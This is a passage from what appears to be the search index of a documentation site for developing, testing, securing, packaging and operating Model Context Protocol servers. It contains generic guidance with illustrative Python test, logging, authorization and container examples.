secrets in code or configuration files</li> <li>Use environment variables for local development</li> <li>Integrate with enterprise secret managers for production</li> <li>Implement secret rotation patterns</li> <li>Log secret access for audit trails (but never log the secrets themselves)</li> </ul>"},{"location":"develop/#error-handling-and-resilience","title":"Error Handling and Resilience","text":""},{"location":"develop/#comprehensive-error-strategy","title":"Comprehensive Error Strategy","text":"<p>Error classification: - Client errors: Invalid input, authentication failures, authorization denials - Server errors: Internal failures, dependency outages, resource exhaustion - Business errors: Domain-specific validation failures, state conflicts</p> <p>Error handling patterns: </p><pre><code>from enum import Enum\n\nclass ErrorCategory(str, Enum):\n    CLIENT_ERROR = \"client_error\"\n    SERVER_ERROR = \"server_error\"\n    BUSINESS_ERROR = \"business_error\"\n\nclass MCPError(Exception):\n    \"\"\"Base MCP error with structured information\"\"\"\n    def __init__(self, message: str, category: ErrorCategory, details: dict = None):\n        super().__init__(message)\n        self.category = category\n        self.details = details or {}\n</code></pre><p></p>"},{"location":"develop/#resilience-patterns","title":"Resilience Patterns","text":"<ul> <li>Circuit breakers: Protect against cascading failures</li> <li>Retry with backoff: Handle transient failures gracefully  </li> <li>Timeout management: Set appropriate timeouts for all operations</li> <li>Bulkhead isolation: Isolate failure domains to prevent total outages</li> </ul>"},{"location":"develop/#instrumentation-and-observability","title":"Instrumentation and Observability","text":""},{"location":"develop/#structured-logging","title":"Structured Logging","text":"<pre><code>import structlog\n\nlogger = structlog.get_logger()\n\n@mcp.tool()\nasync def instrumented_tool(text: str) -&gt; str:\n    \"\"\"Tool with comprehensive instrumentation\"\"\"\n    correlation_id = generate_correlation_id()\n    \n    await logger.info(\n        \"Tool execution started\",\n        tool_name=\"instrumented_tool\",\n        correlation_id=correlation_id,\n        input_length=len(text)\n    )\n    \n    try:\n        result = await process_with_timeout(text)\n        \n        await logger.info(\n            \"Tool execution completed\",\n            correlation_id=correlation_id,\n            success=True,\n            output_length=len(result)\n        )\n        \n        return result\n        \n    except Exception as e:\n        await logger.error(\n            \"Tool execution failed\",\n            correlation_id=correlation_id,\n            error=str(e),\n            error_type=type(e).__name__\n        )\n        raise\n</code></pre>"},{"location":"develop/#metrics-and-monitoring","title":"Metrics and Monitoring","text":"<p>Key metrics to track: - Tool success/failure rates - Request latency percentiles (p50, p95, p99) - Concurrent request counts - External dependency response times - Resource utilization (CPU, memory, connections)</p>"},{"location":"develop/#health-and-readiness-checks","title":"Health and Readiness Checks","text":"<pre><code>@app.get(\"/health\")\nasync def health_check():\n    \"\"\"Health endpoint for monitoring\"\"\"\n    checks = {\n        \"server\": \"healthy\",\n        \"database\": await check_database_health(),\n        \"external_api\": await check_api_health(),\n    }\n    \n    status = \"healthy\" if all(v == \"healthy\" for v in checks.values()) else \"degraded\"\n    \n    return {\"status\": status, \"checks\": checks}\n</code></pre>"},{"location":"develop/#security-in-development","title":"Security in Development","text":""},{"location":"develop/#authentication-and-authorization","title":"Authentication and Authorization","text":"<pre><code>from functools import wraps\n\ndef require_scope(required_scope: str):\n    \"\"\"Decorator for tool-level authorization\"\"\"\n    def decorator(func):\n        @wraps(func)\n        async def wrapper(*args, **kwargs):\n            # Extract user context from request\n            user_scopes = get_user_scopes_from_context()\n            \n            if required_scope not in user_scopes:\n                raise MCPError(\n                    f\"Insufficient permissions: {required_scope} required\",\n                    ErrorCategory.CLIENT_ERROR\n                )\n            \n            return await func(*args, **kwargs)\n        return wrapper\n    return decorator\n\n@mcp.tool()\n@require_scope(\"data:read\")\nasync def read_sensitive_data(query: str) -&gt; dict:\n    \"\"\"Tool with explicit authorization requirements\"\"\"\n    pass\n</code></pre>"},{"location":"develop/#input-sanitization-and-validation","title":"Input Sanitization and Validation","text":"<ul> <li>Validate all inputs against strict schemas</li> <li>Sanitize outputs to prevent injection attacks</li> <li>Rate limit requests to prevent abuse</li> <li>Audit all operations with sufficient detail for compliance</li> </ul>"},{"location":"develop/#advanced-development-patterns","title":"Advanced Development Patterns","text":""},{"location":"develop/#resource-management","title":"Resource Management","text":"<pre><code>@mcp.resource(\"config://server-settings\")\nasync def get_server_config() -&gt; str:\n    \"\"\"Provide server configuration as a resource\"\"\"\n    config = {\n        \"server_name\": SERVER_CONFIG.server_name,\n        \"capabilities\": [\"tool_execution\", \"resource_access\"],\n        \"version\": \"1.0.0\"\n    }\n    return json.dumps(config, indent=2)\n</code></pre>"},{"location":"develop/#long-running-operations","title":"Long-Running Operations","text":"<pre><code>@mcp.tool()\nasync def async_operation(params: dict) -&gt; dict:\n    \"\"\"Handle long-running operations with progress tracking\"\"\"\n    operation_id = generate_operation_id()\n    \n    # Start async task\n    asyncio.create_task(perform_long_operation(operation_id, params))\n    \n    return {\n        \"operation_id\": operation_id,\n        \"status\": \"started\",\n        \"status_url\": f\"/operations/{operation_id}/status\"\n    }\n\n@mcp.tool()\nasync def check_operation_status(operation_id: str) -&gt; dict:\n    \"\"\"Check status of long-running operation\"\"\"\n    status = await get_operation_status(operation_id)\n    return {\n        \"operation_id\": operation_id,\n        \"status\": status.state,\n        \"progress\": status.progress,\n        \"result\": status.result if status.is_complete else None\n    }\n</code></pre>"},{"location":"develop/#development-tools-and-automation","title":"Development Tools and Automation","text":""},{"location":"develop/#essential-make-targets","title":"Essential Make Targets","text":"<p>Every MCP project should include a <code>Makefile</code> with standardized targets:</p> <pre><code># Development environment\nvenv:           # Create virtual environment\ninstall:        # Install dependencies\nactivate:       # Show activation command\n\n# Development workflow  \nserve:          # Run server locally\ntest:           # Run all tests\nlint:           # Run linters and formatters\ndocs:           # Generate documentation\n\n# Quality assurance\ntest-integration: # Run integration tests\nsecurity-scan:    # Security vulnerability scan\nperformance-test: # Performance benchmarking\n\n# Packaging and deployment\nbuild:          # Build distributable package\ncontainer:      # Build container image\ndeploy:         # Deploy to staging/production\n</code></pre>"},{"location":"develop/#testing-infrastructure","title":"Testing Infrastructure","text":"<pre><code># Comprehensive testing workflow\nmake test           # Unit and integration tests\nmake test-contract  # Schema and contract validation\nmake test-security  # Security testing\nmake test-perf      # Performance testing\nmake test-e2e       # End-to-end testing\n</code></pre>"},{"location":"develop/#deployment-preparation","title":"Deployment Preparation","text":""},{"location":"develop/#containerization-best-practices","title":"Containerization Best Practices","text":"<pre><code># Multi-stage build for optimal image size\nFROM python:3.11-slim as builder\nWORKDIR /app\nCOPY pyproject.toml ./\nRUN pip install uv &amp;&amp; uv venv &amp;&amp; uv pip install -e .\n\nFROM python:3.11-slim as runtime\n# Create non-root user\nRUN useradd --create-home --shell /bin/bash mcp\nWORKDIR /app\nCOPY --from=builder /app/.venv /app/.venv\nCOPY src/ ./src/\nUSER mcp\nEXPOSE 8000\nCMD [\"python\", \"-m\", \"src.mcp_server_name.main\"]\n</code></pre>"},{"location":"develop/#production-readiness-checklist","title":"Production Readiness Checklist","text":"<p>\u2705 Configuration: Environment-driven, no hardcoded values \u2705 Security: Authentication, authorization, input validation implemented \u2705 Observability: Logging, metrics, health checks configured \u2705 Error handling: Comprehensive error handling with proper categorization \u2705 Testing: Unit, integration, and contract tests passing \u2705 Documentation: API documentation, runbooks, and troubleshooting guides \u2705 Performance: Latency and throughput requirements validated \u2705 Resilience: Circuit breakers, timeouts, and retry logic implemented  </p>"},{"location":"develop/#development-anti-patterns-to-avoid","title":"Development Anti-Patterns to Avoid","text":""},{"location":"develop/#common-mistakes","title":"Common Mistakes","text":"<p>\u274c Monolithic servers: Mixing multiple domains in one server \u274c Hardcoded configuration: Embedding secrets or config in code \u274c Poor error handling: Generic errors without context or categorization \u274c Lack of instrumentation: No logging, metrics, or observability \u274c Synchronous I/O: Blocking operations in async contexts \u274c Version lock-in: Tight coupling to specific framework versions \u274c Security afterthoughts: Adding security as a later concern  </p>"},{"location":"develop/#technical-debt-prevention","title":"Technical Debt Prevention","text":"<ul> <li>Regular dependency updates with automated vulnerability scanning</li> <li>Refactoring sprints to address code quality issues</li> <li>Performance monitoring to catch degradation early</li> <li>Documentation maintenance as part of development process</li> </ul> <p>Next Steps: After development, proceed to Test for comprehensive validation strategies, then Package for distribution preparation.</p> <p>See Also: Best Practices, Package, Deploy, Operate, Secure, Use.</p>"},{"location":"operate/","title":"Operate","text":""},{"location":"operate/#operate-lifecycle-management","title":"Operate (Lifecycle &amp; Management)","text":"<p>Operate MCP servers with consistent lifecycle management, observability, and governance. This page combines operations and management into one high\u2011level guide.</p>"},{"location":"operate/#operational-excellence","title":"Operational Excellence","text":"<ul> <li>Observability: standardized logs, metrics, and tracing; correlate via request IDs and gateway.</li> <li>Automation: automate rollouts, scaling, and remediation; codify runbooks.</li> <li>Reliability: design for failure; use circuit breakers and graceful degradation.</li> <li>Performance: set SLOs; monitor and optimize continuously.</li> <li>Security: defense in depth at runtime (policies, approvals, least privilege).</li> </ul>"},{"location":"operate/#operational-readiness-preprod","title":"Operational Readiness (Pre\u2011Prod)","text":"<ul> <li>Dashboards and alerting in place; on\u2011call rotation and incident response defined.</li> <li>Logging, tracing, and metrics standardized (OpenTelemetry); correlation IDs across components.</li> <li>Backups and recovery tested for any externalized state.</li> <li>Capacity planning done; load/burst and dependency failure modes tested.</li> </ul>"},{"location":"operate/#monitoring-observability","title":"Monitoring &amp; Observability","text":"<ul> <li>Four signals: latency, traffic, errors, saturation; plus policy denials and approval deferrals.</li> <li>Key metrics: tool success rate, p95 latency, error classes, cost/quotas, dependency health.</li> <li>Health/readiness endpoints; dependency checks with timeouts and fallbacks.</li> </ul>"},{"location":"operate/#lifecycle-management","title":"Lifecycle Management","text":"<ul> <li>Curated catalog: only deploy approved servers; require SBOMs, provenance, signatures, and scans.</li> <li>Approval workflow: registration, promotion, ownership, SLOs recorded; audit trails by default.</li> <li>Multi\u2011tenancy: per\u2011tenant isolation for configs, logs, metrics, and limits; tenant\u2011aware authZ.</li> <li>Remote/external servers: govern through a gateway/proxy where possible; document constraints and SLAs.</li> </ul>"},{"location":"operate/#tooling-automation","title":"Tooling &amp; Automation","text":"<ul> <li>One operator/controller framework for all servers; avoid bespoke operators per team.</li> <li>Use Helm or operator frameworks but standardize org\u2011wide; version your ops configs.</li> <li>Runbooks: dependency outages, rate\u2011limit responses, rollback steps, and escalation mapped.</li> </ul>"},{"location":"operate/#slos-and-incident-response","title":"SLOs and Incident Response","text":"<ul> <li>Example baselines to tune: tool success rate \u2265 99.0% monthly; p95 \u2264 400 ms.</li> <li>Taxonomy: availability, latency, correctness (contract failures), security, quota/budget.</li> <li>Flow: detect \u2192 triage (blast radius) \u2192 mitigate (degrade/circuit break) \u2192 RCA \u2192 fix/rollback \u2192 catalog learnings.</li> </ul>"},{"location":"overview/","title":"Introduction","text":""},{"location":"overview/#mcp-overview","title":"MCP Overview","text":""},{"location":"overview/#what-mcp-is","title":"What MCP Is","text":"<p>The Model Context Protocol (MCP) standardizes how applications expose capabilities (tools, resources, and prompts) and how clients discover and invoke them over well\u2011defined transports. It creates a consistent contract between providers and consumers of capabilities so teams can scale integrations without bespoke adapters, hidden side effects, or inconsistent security models.</p>"},{"location":"overview/#why-mcp","title":"Why MCP","text":"<p>Adopting MCP gives organizations a durable interface for connecting AI applications to systems of record and action.</p> <ul> <li>Standardization: consistent, discoverable contracts across integrations</li> <li>Security and control: built-in patterns for authN/Z and policy enforcement</li> <li>Scale and flexibility: works locally (stdio) and remotely (streamable HTTP)</li> <li>Observability: structured telemetry for discovery and invocation flows</li> </ul>"},{"location":"overview/#core-building-blocks","title":"Core Building Blocks","text":"<p>At its core, MCP is a simple client\u2013server protocol with optional gateway mediation.</p> <ul> <li>Servers: expose tools (actions), resources (read-only context), and prompts (templates)</li> <li>Clients/Hosts: discover capabilities and invoke them safely</li> <li>Gateway (optional): centralizes authN/Z, routing, quotas, catalogs, and policy</li> <li>Transports: stdio for local per-user; streamable HTTP for shared, remote services</li> </ul>"},{"location":"overview/#when-to-use-mcp","title":"When to Use MCP","text":"<p>Choose MCP when you need repeatable, governed integrations rather than one\u2011off connectors.</p> <ul> <li>You need a consistent, policy-enforced interface for tools and context</li> <li>You operate many servers/tenants and require centralized governance</li> <li>You want portable integrations decoupled from specific runtime implementations</li> </ul>"},{"location":"overview/#success-factors","title":"Success Factors","text":"<ul> <li>Clear server responsibility and narrow tool scopes</li> <li>Contracts-first design (schemas, side effects, errors)</li> <li>Centralized platform controls where appropriate (gateway)</li> <li>Observability and SLOs established from day one</li> </ul>"},{"location":"overview/#what-mcp-is-not","title":"What MCP Is Not","text":"<ul> <li>Not an agent framework: MCP defines the interface between clients and capability providers; it doesn\u2019t prescribe planning or reasoning.</li> <li>Not a data lake or message bus: it\u2019s a control plane for capability discovery and invocation, not a storage or streaming substrate.</li> <li>Not a silver bullet: it won\u2019t fix unclear ownership, missing contracts, or absent governance by itself.</li> </ul>"},{"location":"overview/#adoption-path-typical","title":"Adoption Path (Typical)","text":"<ol> <li>Define a small, single\u2011purpose server with strict contracts.</li> <li>Add observability and SLOs; validate with tests and evals.</li> <li>Package as a container; sign artifacts and publish to a trusted catalog.</li> <li>Deploy behind a gateway; enforce policy and quotas; iterate with canaries.</li> <li>Expand capabilities gradually, keeping contracts and ownership clear.</li> </ol>"},{"location":"package/","title":"Package","text":""},{"location":"package/#package","title":"Package","text":"<p>Package MCP servers for reliable distribution and deployment. Emphasize supply chain integrity and operational readiness.</p>"},{"location":"package/#packaging-strategies","title":"Packaging Strategies","text":"<ul> <li>Language packages (PyPI/NPM/etc.) can support developer distribution; for production, prefer containers.</li> <li>Containers: OCI images via multi-stage with minimal base images; run as non-root.</li> <li>Binary distributions: only when required; ensure signing and update channels.</li> </ul>"},{"location":"package/#package-structure","title":"Package Structure","text":"<ul> <li>Recommended layout: src (code), tests, docs, configs, scripts, Containerfile, README, CHANGELOG.</li> </ul>"},{"location":"package/#production-containers-guidance","title":"Production Containers (Guidance)","text":"<ul> <li>Use minimal, well-maintained images; drop unnecessary capabilities; read-only file systems.</li> <li>Sign images; maintain SBOMs and provenance; enforce verification in clusters.</li> <li>Externally managed secrets; health and readiness probes; resource requests/limits.</li> </ul>"},{"location":"package/#supply-chain-controls","title":"Supply Chain Controls","text":"<ul> <li>Verified registries and curated catalogs; block untrusted sources.</li> <li>Reproducible builds where feasible; store artifacts with signatures.</li> </ul>"},{"location":"package/#distribution","title":"Distribution","text":"<ul> <li>Publish through trusted channels; include release notes and impact levels.</li> <li>Keep compatibility/support matrices; document upgrade paths and deprecations.</li> </ul>"},{"location":"package/#versioning-strategy","title":"Versioning Strategy","text":"<ul> <li>Semantic versioning for servers, SDKs, and contracts; document breaking changes clearly.</li> <li>Maintain a simple compatibility matrix and update with each release.</li> </ul>"},{"location":"package/#next-steps","title":"Next Steps","text":"<ul> <li>Validate packaging against organizational policies (signing, SBOMs, provenance).</li> <li>Prefer containers for production distribution; enforce non-root and minimal images.</li> </ul>"},{"location":"secure/","title":"Secure","text":""},{"location":"secure/#secure","title":"Secure","text":"<p>Security is a continuous discipline across design, build, deploy, and run. Combine platform-native controls with centralized governance.</p>"},{"location":"secure/#principles","title":"Principles","text":"<ul> <li>Defense in depth with least privilege for tools and actions.</li> <li>Centralize policy where possible (gateway/proxy) to avoid re\u2011implementing controls.</li> <li>Treat authentication, authorization, and audit as first\u2011class requirements.</li> </ul>"},{"location":"secure/#threats-controls-high-level","title":"Threats &amp; Controls (High-Level)","text":"<ul> <li>Input manipulation &amp; injection: strict schemas, validation, and output sanitization.</li> <li>Over\u2011privilege &amp; escalation: scoped tokens, approvals for high\u2011impact ops, runtime policy checks.</li> <li>Data leakage: data classification, minimization, redaction, and isolation.</li> <li>Supply chain risk: SBOMs, signing, provenance, trusted registries, vulnerability scanning.</li> <li>Drift &amp; misconfiguration: baseline configs, policy-as-code, continuous posture checks.</li> </ul>"},{"location":"secure/#identity-access","title":"Identity &amp; Access","text":"<ul> <li>Granular scopes per tool/action; time\u2011limited, auditable credentials.</li> <li>Support OIDC/OAuth2 patterns as per spec; prefer mTLS between services.</li> <li>Record who/what/when/why with immutable audit trails.</li> </ul>"},{"location":"secure/#runtime-protection","title":"Runtime Protection","text":"<ul> <li>Sandboxing (gVisor/Kata) and OS controls (seccomp, SELinux/AppArmor, cgroups).</li> <li>Network policy: least-privilege egress/ingress; mTLS; explicit allowlists.</li> <li>Circuit breakers and rate limits per tenant/tool; backoff with jitter.</li> </ul>"},{"location":"secure/#monitoring-response","title":"Monitoring &amp; Response","text":"<ul> <li>Dedicated security log stream; alerts for policy denials, unusual access, and data exfiltration patterns.</li> <li>Incident flow: detect \u2192 contain \u2192 investigate \u2192 remediate \u2192 recover \u2192 review.</li> </ul>"},{"location":"secure/#compliance","title":"Compliance","text":"<ul> <li>Align with organizational standards (SOC2/ISO/etc.); automate evidence capture.</li> <li>Apply continuous assurance, not point\u2011in\u2011time checks.</li> </ul>"},{"location":"secure/#next-steps","title":"Next Steps","text":"<ul> <li>Centralize controls through a gateway/proxy where possible to avoid duplicating security logic across servers.</li> <li>Align with organizational compliance standards and document continuous assurance practices.</li> </ul>"},{"location":"test/","title":"Test","text":""},{"location":"test/#test-comprehensive-mcp-server-validation","title":"Test \u2014 Comprehensive MCP Server Validation","text":"<p>Validate MCP servers for correctness, safety, performance, and AI agent compatibility. Focus on behavior, contracts, and real-world agent interactions through systematic testing approaches.</p>"},{"location":"test/#testing-philosophy","title":"Testing Philosophy","text":""},{"location":"test/#core-testing-principles","title":"Core Testing Principles","text":"<ul> <li>Behavior-driven validation: Test what the server does, not just how it's implemented</li> <li>Contract-first testing: Validate schemas, inputs, outputs, and side effects rigorously</li> <li>Agent-centric evaluation: Test how AI agents actually interact with your tools</li> <li>Production simulation: Test with realistic data, load patterns, and failure scenarios</li> <li>Continuous validation: Integrate testing into development workflow and deployment pipeline</li> </ul>"},{"location":"test/#quality-gates-and-success-criteria","title":"Quality Gates and Success Criteria","text":"<ul> <li>Functional correctness: All tools produce expected outputs for valid inputs</li> <li>Safety and security: Invalid inputs are rejected, authorization is enforced</li> <li>Performance standards: Latency and throughput meet defined SLOs</li> <li>Agent usability: AI agents can discover, understand, and effectively use tools</li> <li>Reliability: Server handles failures gracefully and maintains availability</li> </ul>"},{"location":"test/#testing-pyramid-for-mcp-servers","title":"Testing Pyramid for MCP Servers","text":""},{"location":"test/#unit-tests-foundation-60-70","title":"Unit Tests (Foundation - 60-70%)","text":"<p>Purpose: Fast, isolated validation of individual components and business logic</p> <p>Focus areas: - Tool logic and algorithms - Input validation and sanitization - Error handling and edge cases - Configuration management - Utility functions and helpers</p> <p>Example unit test structure: </p><pre><code>import pytest\nfrom unittest.mock import Mock, patch\nfrom your_server.tools import process_data\n\nclass TestProcessDataTool:\n    def test_valid_input_processing(self):\n        \"\"\"Test tool with valid input produces expected output\"\"\"\n        result = process_data(\"valid input\", {\"option\": \"value\"})\n        assert result.success is True\n        assert result.data == expected_output\n    \n    def test_invalid_input_rejection(self):\n        \"\"\"Test tool properly rejects invalid input\"\"\"\n        with pytest.raises(ValueError, match=\"Invalid input format\"):\n            process_data(\"\", {})\n    \n    def test_edge_case_handling(self):\n        \"\"\"Test tool handles edge cases gracefully\"\"\"\n        large_input = \"x\" * 10000\n        result = process_data(large_input, {})\n        assert len(result.data) &lt;= 1000  # Truncated appropriately\n    \n    @patch('your_server.external_api.call_service')\n    def test_dependency_failure_handling(self, mock_api):\n        \"\"\"Test tool handles external dependency failures\"\"\"\n        mock_api.side_effect = ConnectionError(\"Service unavailable\")\n        with pytest.raises(ServiceUnavailableError):\n            process_data(\"test\", {\"use_external\": True})\n</code></pre><p></p>"},{"location":"test/#integration-tests-structure-20-30","title":"Integration Tests (Structure - 20-30%)","text":"<p>Purpose: Validate MCP protocol compliance and component interactions</p> <p>Focus areas: - MCP protocol message handling - Tool discovery and schema validation - Resource access and content delivery - Authentication and authorization flows - Database and external service integrations</p> <p>MCP protocol integration tests: </p><pre><code>import pytest\nfrom mcp.client import McpClient\nfrom your_server import start_server\n\n@pytest.mark.asyncio\nclass TestMCPIntegration:\n    async def test_server_initialization(self):\n        \"\"\"Test server starts and responds to initialization\"\"\"\n        async with McpClient() as client:\n            info = await client.initialize()\n            assert info.protocol_version == \"0.1.0\"\n            assert info.server_info.name == \"your-server\"\n    \n    async def test_tool_discovery(self):\n        \"\"\"Test tool discovery returns correct schemas\"\"\"\n        async with McpClient() as client:\n            await client.initialize()\n            tools = await client.list_tools()\n            \n            assert len(tools) &gt; 0\n            process_tool = next(t for t in tools if t.name == \"process_data\")\n            assert process_tool.input_schema is not None\n            assert \"text\" in process_tool.input_schema[\"properties\"]\n    \n    async def test_tool_execution_flow(self):\n        \"\"\"Test complete tool execution workflow\"\"\"\n        async with McpClient() as client:\n            await client.initialize()\n            \n            result = await client.call_tool(\n                \"process_data\", \n                {\"text\": \"test input\", \"options\": {}}\n            )\n            \n            assert result.is_error is False\n            assert \"result\" in result.content[0].text\n    \n    async def test_authorization_enforcement(self):\n        \"\"\"Test authorization is properly enforced\"\"\"\n        async with McpClient(token=\"invalid\") as client:\n            await client.initialize()\n            \n            with pytest.raises(PermissionError):\n                await client.call_tool(\"restricted_tool\", {})\n</code></pre><p></p>"},{"location":"test/#end-to-end-tests-integration-10-15","title":"End-to-End Tests (Integration - 10-15%)","text":"<p>Purpose: Validate complete workflows with real configurations and dependencies</p> <p>Focus areas: - Gateway integration and routing - Multi-server orchestration - Production-like configurations - Real external service interactions - Performance under realistic load</p> <p>E2E test example: </p><pre><code>import pytest\nimport asyncio\nfrom test_utils import start_gateway, register_server, create_test_client\n\n@pytest.mark.e2e\nclass TestCompleteWorkflow:\n    @pytest.fixture\n    async def gateway_setup(self):\n        \"\"\"Setup gateway with registered server\"\"\"\n        gateway = await start_gateway()\n        await register_server(gateway, \"test-server\", \"http://localhost:8000\")\n        yield gateway\n        await gateway.shutdown()\n    \n    async def test_client_to_server_via_gateway(self, gateway_setup):\n        \"\"\"Test complete client \u2192 gateway \u2192 server flow\"\"\"\n        client = create_test_client(gateway_url=\"http://localhost:4444\")\n        \n        # Test tool discovery through gateway\n        tools = await client.discover_tools()\n        assert \"process_data\" in [t.name for t in tools]\n        \n        # Test tool execution through gateway\n        result = await client.execute_tool(\n            \"process_data\",\n            {\"text\": \"integration test\", \"options\": {\"format\": \"json\"}}\n        )\n        \n        assert result.success is True\n        assert \"integration test\" in str(result.data)\n</code></pre><p></p>"},{"location":"test/#agent-evaluation-and-ai-testing","title":"Agent Evaluation and AI Testing","text":""},{"location":"test/#agent-eval-framework","title":"Agent Eval Framework","text":"<p>Purpose: Evaluate how effectively AI agents can discover, understand, and use your MCP tools</p> <p>Agent Eval provides systematic evaluation of MCP servers from an AI agent perspective, measuring: - Discoverability: How easily agents find relevant tools - Usability: How successfully agents use tools to complete tasks - Reliability: How consistently tools work across different agent interactions - Task completion: How well agents accomplish goals using your tools</p> <p>Agent Eval implementation: </p><pre><code>from agent_eval import Evaluator, TaskSet, Agent\n\nclass MCPServerEvaluator:\n    def __init__(self, server_url: str):\n        self.evaluator = Evaluator()\n        self.server_url = server_url\n        self.agent = Agent(\n            model=\"claude-3-sonnet\",\n            mcp_server=server_url\n        )\n    \n    def create_task_suite(self) -&gt; TaskSet:\n        \"\"\"Define evaluation tasks for your MCP server\"\"\"\n        return TaskSet([\n            {\n                \"name\": \"data_processing_task\",\n                \"description\": \"Process user data and return formatted results\",\n                \"input\": \"Process this CSV data: name,age\\\\nJohn,25\\\\nJane,30\",\n                \"expected_capabilities\": [\"process_data\", \"format_output\"],\n                \"success_criteria\": [\n                    \"Data is correctly parsed\",\n                    \"Output is properly formatted\",\n                    \"No errors in processing\"\n                ]\n            },\n            {\n                \"name\": \"error_handling_task\", \n                \"description\": \"Handle invalid input gracefully\",\n                \"input\": \"Process this invalid data: !!!invalid!!!\",\n                \"expected_behavior\": \"graceful_error_handling\",\n                \"success_criteria\": [\n                    \"Error is caught and handled\",\n                    \"Meaningful error message provided\",\n                    \"Agent can recover and suggest alternatives\"\n                ]\n            }\n        ])\n    \n    async def run_evaluation(self) -&gt; dict:\n        \"\"\"Run comprehensive agent evaluation\"\"\"\n        task_suite = self.create_task_suite()\n        \n        results = await self.evaluator.evaluate(\n            agent=self.agent,\n            tasks=task_suite,\n            iterations=10  # Run multiple times for statistical significance\n        )\n        \n        return {\n            \"overall_score\": results.overall_score,\n            \"task_success_rate\": results.task_success_rate,\n            \"tool_usage_efficiency\": results.tool_usage_efficiency,\n            \"error_handling_score\": results.error_handling_score,\n            \"detailed_results\": results.task_results\n        }\n</code></pre><p></p>"},{"location":"test/#cross-model-validation","title":"Cross-Model Validation","text":"<p>Test with multiple AI models to ensure broad compatibility:</p> <pre><code>@pytest.mark.agent_eval\nclass TestCrossModelCompatibility:\n    models = [\"claude-3-sonnet\", \"gpt-4\", \"gemini-pro\"]\n    \n    @pytest.mark.parametrize(\"model\", models)\n    async def test_model_tool_usage(self, model):\n        \"\"\"Test tool usage across different AI models\"\"\"\n        agent = Agent(model=model, mcp_server=self.server_url)\n        \n        # Test basic tool discovery\n        tools = await agent.discover_tools()\n        assert len(tools) &gt; 0\n        \n        # Test tool usage with standard task\n        result = await agent.complete_task(\n            \"Process the data: name,value\\ntest,123\",\n            available_tools=tools\n        )\n        \n        assert result.success_rate &gt; 0.8  # 80% success threshold\n        assert result.tool_calls &gt; 0\n        assert \"123\" in str(result.output)\n</code></pre>"},{"location":"test/#behavioral-testing-and-golden-sets","title":"Behavioral Testing and Golden Sets","text":"<p>Golden set evaluation for consistent behavior validation:</p> <pre><code>class GoldenSetTester:\n    def __init__(self):\n        self.golden_sets = self.load_golden_sets()\n    \n    def load_golden_sets(self) -&gt; dict:\n        \"\"\"Load curated test cases with expected outputs\"\"\"\n        return {\n            \"data_processing\": [\n                {\n                    \"input\": {\"text\": \"hello world\", \"format\": \"upper\"},\n                    \"expected_output\": \"HELLO WORLD\",\n                    \"metadata\": {\"operation\": \"case_conversion\"}\n                },\n                {\n                    \"input\": {\"text\": \"test@example.com\", \"format\": \"email_validation\"},\n                    \"expected_output\": {\"valid\": True, \"domain\": \"example.com\"},\n                    \"metadata\": {\"operation\": \"email_processing\"}\n                }\n            ]\n        }\n    \n    async def validate_against_golden_set(self, tool_name: str) -&gt; dict:\n        \"\"\"Validate tool outputs against golden set\"\"\"\n        test_cases = self.golden_sets.get(tool_name, [])\n        results = []\n        \n        for case in test_cases:\n            try:\n                actual_output = await call_tool(tool_name, case[\"input\"])\n                match = self.compare_outputs(actual_output, case[\"expected_output\"])\n                results.append({\n                    \"test_case\": case,\n                    \"actual_output\": actual_output,\n                    \"matches_expected\": match,\n                    \"passed\": match\n                })\n            except Exception as e:\n                results.append({\n                    \"test_case\": case,\n                    \"error\": str(e),\n                    \"passed\": False\n                })\n        \n        return {\n            \"total_tests\": len(test_cases),\n            \"passed\": sum(1 for r in results if r[\"passed\"]),\n            \"pass_rate\": sum(1 for r in results if r[\"passed\"]) / len(test_cases),\n            \"detailed_results\": results\n        }\n</code></pre>"},{"location":"test/#performance-and-load-testing","title":"Performance and Load Testing","text":""},{"location":"test/#load-testing-strategy","title":"Load Testing Strategy","text":"<p>Establish performance baselines and validate under realistic load:</p> <pre><code>import asyncio\nimport time\nfrom concurrent.futures import ThreadPoolExecutor\n\nclass LoadTester:\n    def __init__(self, server_url: str):\n        self.server_url = server_url\n        self.metrics = {\n            \"requests_sent\": 0,\n            \"requests_successful\": 0,\n            \"response_times\": [],\n            \"errors\": []\n        }\n    \n    async def single_request_test(self, tool_name: str, params: dict):\n        \"\"\"Execute single request and measure performance\"\"\"\n        start_time = time.time()\n        \n        try:\n            result = await call_tool(tool_name, params)\n            response_time = time.time() - start_time\n            \n            self.metrics[\"requests_sent\"] += 1\n            self.metrics[\"requests_successful\"] += 1\n            self.metrics[\"response_times\"].append(response_time)\n            \n            return result\n            \n        except Exception as e:\n            self.metrics[\"requests_sent\"] += 1\n            self.metrics[\"errors\"].append(str(e))\n            raise\n    \n    async def load_test(self, tool_name: str, params: dict, \n                       concurrent_users: int, duration_seconds: int):\n        \"\"\"Run load test with specified concurrency and duration\"\"\"\n        end_time = time.time() + duration_seconds\n        tasks = []\n        \n        while time.time() &lt; end_time:\n            # Maintain specified concurrency\n            active_tasks = [t for t in tasks if not t.done()]\n            \n            while len(active_tasks) &lt; concurrent_users and time.time() &lt; end_time:\n                task = asyncio.create_task(\n                    self.single_request_test(tool_name, params)\n                )\n                tasks.append(task)\n                active_tasks.append(task)\n                \n                # Small delay to prevent overwhelming\n                await asyncio.sleep(0.1)\n        \n        # Wait for remaining tasks\n        await asyncio.gather(*tasks, return_exceptions=True)\n        \n        return self.analyze_results()\n    \n    def analyze_results(self) -&gt; dict:\n        \"\"\"Analyze load test results\"\"\"\n        response_times = self.metrics[\"response_times\"]\n        \n        if not response_times:\n            return {\"error\": \"No successful responses recorded\"}\n        \n        return {\n            \"total_requests\": self.metrics[\"requests_sent\"],\n            \"successful_requests\": self.metrics[\"requests_successful\"],\n            \"error_rate\": len(self.metrics[\"errors\"]) / self.metrics[\"requests_sent\"],\n            \"avg_response_time\": sum(response_times) / len(response_times),\n            \"p50_response_time\": sorted(response_times)[len(response_times)//2],\n            \"p95_response_time\": sorted(response_times)[int(len(response_times)*0.95)],\n            \"p99_response_time\": sorted(response_times)[int(len(response_times)*0.99)],\n            \"requests_per_second\": len(response_times) / max(response_times) if response_times else 0\n        }\n\n# Usage in tests\n@pytest.mark.performance\nclass TestPerformance:\n    async def test_single_user_latency(self):\n        \"\"\"Test response times under normal load\"\"\"\n        tester = LoadTester(\"http://localhost:8000\")\n        \n        result = await tester.load_test(\n            tool_name=\"process_data\",\n            params={\"text\": \"performance test\", \"options\": {}},\n            concurrent_users=1,\n            duration_seconds=30\n        )\n        \n        assert result[\"p95_response_time\"] &lt; 0.5  # 500ms SLO\n        assert 